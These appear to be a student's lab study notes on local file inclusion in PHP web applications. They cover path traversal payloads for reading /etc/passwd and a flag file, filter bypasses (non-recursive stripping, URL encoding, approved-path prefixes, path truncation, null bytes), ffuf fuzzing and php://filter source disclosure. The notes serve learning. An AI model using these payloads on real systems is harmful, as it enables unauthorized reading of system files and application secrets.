#### First order LFI
- Just injecting the payload in the url itself to try and pull local backend files. eg:
```python
http://154.57.164.83:30138/index.php?language=/../../../../../../../..//usr/share/flags/flag.txt
```

#### Second order LFI
- For example, we save our username as an LFI payload and then when another functionality of the webserver tries to pull our username, it could pull local files that we specified directly from the backend. Since there are two steps, its called second order LFI

# Bypassing Filters
## Non-Recursive Path Traversal Filters
- These filters remove the '../' part of our lfi payload and make it useless.
- This filter is highly insecure because it does not recursively remove the ../ substring
- if we use something like the below, we can bypass this filter: 
  ```python
  http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
  ```
## Encoding
- Some filters may prevent input filters that include certain LFI-related characters like **.** or a slash **/**
- If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter.

## Approved Paths
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
- To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify, as follows:
```python
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

## Appended Extension
- With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful
## Path Truncation
```python
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
## Null Bytes
- PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
- To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`)

# PHP Filters
- we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
## Fuzzing for PHP Files
```python
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
## Source Code Disclosure
- Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.
- eg:
```python
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
